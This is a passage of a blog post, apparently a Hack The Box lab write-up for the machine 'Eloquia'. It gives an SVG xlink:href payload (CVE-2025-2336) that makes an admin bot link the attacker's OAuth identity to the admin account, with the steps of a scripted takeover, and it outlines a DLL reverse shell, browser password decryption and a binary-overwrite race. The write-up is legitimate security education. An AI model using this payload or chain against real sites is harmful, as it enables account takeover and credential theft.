@@ -1,0 +1,1125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/10/16/hackthebox-eloquia/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewEloquia is an insane-difficulty Windows machine from Hack The Box, and it’s one of those boxes where every single step is a timing problem dressed up as a web problem. The front door is an IIS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Eloquia">
+<meta property="og:url" content="http://fouedsaidi.com/2026/10/16/Hackthebox-Eloquia/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewEloquia is an insane-difficulty Windows machine from Hack The Box, and it’s one of those boxes where every single step is a timing problem dressed up as a web problem. The front door is an IIS">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Eloquia/Eloquia.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Eloquia/connected-accounts.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Eloquia/qooqle-signin.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Eloquia/qooqle-profile.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Eloquia/admin-takeover.png">
+<meta property="article:published_time" content="2026-10-16T16:10:00.000Z">
+<meta property="article:modified_time" content="2026-10-16T22:00:34.200Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="hackthebox">
+<meta property="article:tag" content="AngularJS">
+<meta property="article:tag" content="ngSanitize">
+<meta property="article:tag" content="CVE-2025-2336">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="OAuth2">
+<meta property="article:tag" content="Account Takeover">
+<meta property="article:tag" content="SQLite">
+<meta property="article:tag" content="load_extension">
+<meta property="article:tag" content="DLL">
+<meta property="article:tag" content="IIS">
+<meta property="article:tag" content="Microsoft Edge">
+<meta property="article:tag" content="DPAPI">
+<meta property="article:tag" content="AES-GCM">
+<meta property="article:tag" content="evil-winrm">
+<meta property="article:tag" content="Race Condition">
+<meta property="article:tag" content="Windows-PE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Eloquia/Eloquia.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Eloquia -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Eloquia</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-10-16 19:10</span>
+        <span class="mobile">2026-10-16 19:10</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-10-17 01:34</span>
+            <span class="mobile">2026-10-17 01:34</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/hackthebox/">hackthebox</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/AngularJS/">AngularJS</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ngSanitize/">ngSanitize</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CVE-2025-2336/">CVE-2025-2336</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/XSS/">XSS</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/OAuth2/">OAuth2</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Account-Takeover/">Account Takeover</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/SQLite/">SQLite</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/load-extension/">load_extension</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/DLL/">DLL</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/IIS/">IIS</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Microsoft-Edge/">Microsoft Edge</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/DPAPI/">DPAPI</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/AES-GCM/">AES-GCM</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/evil-winrm/">evil-winrm</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Race-Condition/">Race Condition</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Windows-PE/">Windows-PE</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Eloquia is an insane-difficulty Windows machine from Hack The Box, and it’s one of those boxes where every single step is a <em>timing</em> problem dressed up as a web problem. The front door is an IIS-hosted Django blog that supports “log in with Qooqle” — a fake OAuth2 provider living on a second vhost — and the article editor renders user content through <strong>AngularJS with ngSanitize</strong>, which is vulnerable to <strong>CVE-2025-2336</strong>: <code>xlink:href</code> on an SVG <code>&lt;image&gt;</code> element survives sanitisation. There’s an admin bot that visits reported articles, so we get a one-shot XSS primitive against an authenticated admin session. We don’t use it to steal a cookie, though. We use it to make the admin’s browser walk through <em>our</em> OAuth callback, which links <strong>our</strong> Qooqle identity to <strong>their</strong> Eloquia account — and the authorization code we inject is only valid for about fifteen seconds, so the whole create-and-report chain has to be automated. Once we’re admin, the panel’s “queries” feature lets us run raw SQLite, and SQLite’s <code>load_extension()</code> will happily load a DLL we uploaded as an article banner, which gives us a reverse shell as <code>eloquia\web</code>. From there we loot Microsoft Edge’s <code>Login Data</code> store, decrypt the AES-GCM <code>v10</code> blobs with the DPAPI-protected key out of <code>Local State</code>, and recover <code>olivia.kat</code>‘s password for WinRM. Root is a Visual Studio project sitting in <code>C:\Program Files</code> whose build output — a Fail2Ban clone running as SYSTEM — gets rebuilt and re-run on a loop, so we win a race to overwrite <code>Failure2Ban.exe</code> with our own binary and catch SYSTEM.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Eloquia/Eloquia.png"
+                      alt="Eloquia-info-card"
+                ><figcaption>Eloquia-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>Usual full-port scan to start:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Did not follow redirect to http://eloquia.htb/</span><br><span class="line">5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10</span><br><span class="line">Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure></div>
+
+<p>Two ports, and that’s genuinely all there is. No SMB, no LDAP, no Kerberos — this is a standalone IIS web server, not a domain controller, so the entire first half of the box is going to be web. <code>5985</code> is WinRM, which tells us the intended lateral move is credential-based: at some point we are expected to find a username and password, not a ticket.</p>
+<p>Port 80 redirects to <code>http://eloquia.htb/</code>, so into <code>/etc/hosts</code> it goes.</p>
+<h2 id="Web-Application-http-eloquia-htb"><a href="#Web-Application-http-eloquia-htb" class="headerlink" title="Web Application - http://eloquia.htb/"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://eloquia.htb/" >http://eloquia.htb/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><p>Eloquia is a blogging platform. We can register an account, log in, write articles, and report other people’s articles. The stack is Django behind IIS, and the thing worth noticing immediately is on the profile page:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Eloquia/connected-accounts.png"
+                      alt="Eloquia-connected-accounts"
+                ><figcaption>Eloquia-connected-accounts</figcaption></figure></p>
+<blockquote>
+<p>Here you can review your connected account which you can use for login without password…<br>Please note that you can replace a conncted account with another one by clicking on “Change”.</p>
+</blockquote>
+<p>Three OAuth providers — Qooqle, FaceBook, X(Twitter) — all <code>inactive</code> for a fresh account. Two of those are decoration. <strong>Qooqle</strong> is not: it’s a vhost on this same box, a Google clone right down to the multicoloured wordmark.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Eloquia/qooqle-signin.png"
+                      alt="Eloquia-qooqle-signin"
+                ><figcaption>Eloquia-qooqle-signin</figcaption></figure></p>
+<p>Add <code>qooqle.htb</code> to <code>/etc/hosts</code>, register an account there too, and then click “Change” next to Qooqle back on Eloquia. We get bounced through a textbook OAuth2 authorization-code flow:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://qooqle.htb/oauth2/authorize/?client_id=riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi&amp;response_type=code&amp;redirect_uri=http://eloquia.htb/accounts/oauth2/qooqle/callback/</span><br></pre></td></tr></table></figure></div>
+
+<p>Approve it on the Qooqle side and the provider redirects back to:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=HZJlxpc6KogKAPUq1lGtoSCniq4yM9</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Eloquia/qooqle-profile.png"
+                      alt="Eloquia-qooqle-profile"
+                ><figcaption>Eloquia-qooqle-profile</figcaption></figure></p>
+<p>Now — read that callback URL again and think about what it actually does, because this is the whole box.</p>
+<p>That URL is a <strong>GET request with no CSRF protection and no <code>state</code> parameter</strong>. The <code>code</code> identifies <em>the Qooqle account that approved the flow</em>. The session cookie on the request identifies <em>the Eloquia account doing the linking</em>. The handler takes those two things and says “this Eloquia user now owns that Qooqle identity.”</p>
+<p>Which means the two halves of the decision come from two completely independent places. If I can get <strong>someone else’s browser</strong> to fetch a callback URL carrying <strong>my</strong> code, their Eloquia account gets linked to my Qooqle identity — and then I log in as them with “Log In with Qooqle” and no password at all.</p>
+<p>That’s not a credential theft. It’s an identity <em>graft</em>, and it’s strictly better than stealing a cookie because it survives logout, session expiry and password changes. The missing <code>state</code> parameter is the entire reason it’s possible; <code>state</code> exists specifically to bind an OAuth callback to the session that started it, and it isn’t here.</p>
+<p>So all we need is a way to make the admin’s browser issue one GET request. Which brings us to the article editor.</p>
+<h2 id="CVE-2025-2336-AngularJS-ngSanitize-SVG-XSS"><a href="#CVE-2025-2336-AngularJS-ngSanitize-SVG-XSS" class="headerlink" title="CVE-2025-2336 - AngularJS ngSanitize SVG XSS"></a>CVE-2025-2336 - AngularJS ngSanitize SVG XSS</h2><p>Articles are created at <code>http://eloquia.htb/article/create/</code> and rendered at <code>http://eloquia.htb/article/visit/&lt;id&gt;/</code>. The content field accepts HTML, and the page runs it through AngularJS’s <code>ngSanitize</code> before binding it. Standard payloads die exactly as you’d expect — <code>&lt;script&gt;</code>, <code>onerror=</code>, <code>javascript:</code> hrefs, all stripped.</p>
+<p>Better still, there’s a report button, and reporting an article gets you this:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">**</span><br><span class="line"></span><br><span class="line">- Article reported successfully. Our team will review this article to see if it violates any of our policies.</span><br><span class="line"></span><br><span class="line">**</span><br></pre></td></tr></table></figure></div>
+
+<p>“Our team will review this article” is HTB for <em>an admin bot will open this page in a real browser in the next few seconds</em>. So we have a bot, we have a sink, and we need a sanitiser bypass.</p>
+<p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2025-2336/"><strong>CVE-2025-2336</strong></a> is exactly that. AngularJS’s <code>ngSanitize</code> improperly sanitises the value of the <code>href</code> and <code>xlink:href</code> attributes inside an SVG <code>&lt;image&gt;</code> element. The sanitiser’s URL-scheme allow-list is applied to the attributes it knows about on HTML elements; <code>xlink:href</code> in the SVG namespace slips past it, and the browser then dereferences that URL to fetch the image.</p>
+<p>The important nuance — and the reason this bug maps so perfectly onto this box — is what the primitive actually <em>is</em>. <code>xlink:href</code> on <code>&lt;image&gt;</code> does not give us script execution. It gives us a <strong>forced GET request from the victim’s browser, with the victim’s cookies attached</strong>. On most targets that’s a weak finding you’d file as low severity.</p>
+<p>Here it’s the only thing we need, because the OAuth callback <em>is</em> a GET request authenticated by cookie. The vulnerability class and the application logic line up so neatly that the weaker primitive is sufficient.</p>
+<p>Our payload, then, is a 1×1 SVG image whose source is our own OAuth callback URL:</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">image</span> <span class="attr">xlink:href</span>=<span class="string">&quot;http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=OUR_CODE&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>URGENT<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>When the admin bot loads the article, its browser tries to fetch that “image”, sends the GET with the admin’s session cookie, and Django’s callback handler links our Qooqle account to the admin’s Eloquia account. The fetch fails to produce an image, of course. Nobody is looking.</p>
+<h2 id="Winning-the-15-Second-Race"><a href="#Winning-the-15-Second-Race" class="headerlink" title="Winning the 15-Second Race"></a>Winning the 15-Second Race</h2><p>Here’s where the box earns its difficulty rating. The authorization code Qooqle hands out is <strong>single-use and expires in roughly fifteen seconds</strong>. Doing this by hand is hopeless: by the time you’ve copied the callback URL out of Burp, pasted it into the article body, saved the article and clicked report, the code is long dead and the bot gets a <code>400</code>.</p>
+<p>Everything from “generate the code” to “the bot loads the page” has to fit in that window. That means the whole chain needs to be scripted:</p>
+<ol>
+<li>Log into Eloquia as our low-privileged user (<code>kujen</code>) and keep that session.</li>
+<li>Log into Qooqle as our user in a <strong>separate</strong> cookie jar.</li>
+<li>Kick off the OAuth flow, approve it, and capture the <code>Location</code> header containing our fresh <code>code</code>. <em>The clock starts here.</em></li>
+<li>Create an article whose content is the SVG payload wrapping that callback URL.</li>
+<li>Report it immediately.</li>
+<li>Wait for the bot, then check whether our Qooqle identity now logs us in as <code>admin</code>.</li>
+</ol>
+<p>A few implementation details that matter more than they look:</p>
+<ul>
+<li>The Eloquia and Qooqle sessions <strong>must</strong> be separate HTTP clients. Share a cookie jar and the flows trample each other.</li>
+<li>Redirects have to be disabled (<code>Policy::none()</code>), because the code only exists in the <code>Location</code> header of the authorize POST. Follow it and the client consumes our own code and links it to <em>us</em>.</li>
+<li>Django wants a <code>csrfmiddlewaretoken</code> on every POST, so each step is GET-then-scrape-then-POST.</li>
+<li>Article creation is <code>multipart/form-data</code> with a mandatory <code>banner</code> file. Downloading the site’s own banner PNG once at startup and re-sending those bytes is faster and less suspicious than generating one.</li>
+</ul>
+<p>I wrote it in Rust, mostly because the first few Python attempts kept landing at 16–18 seconds and I got tired of losing by two seconds:</p>
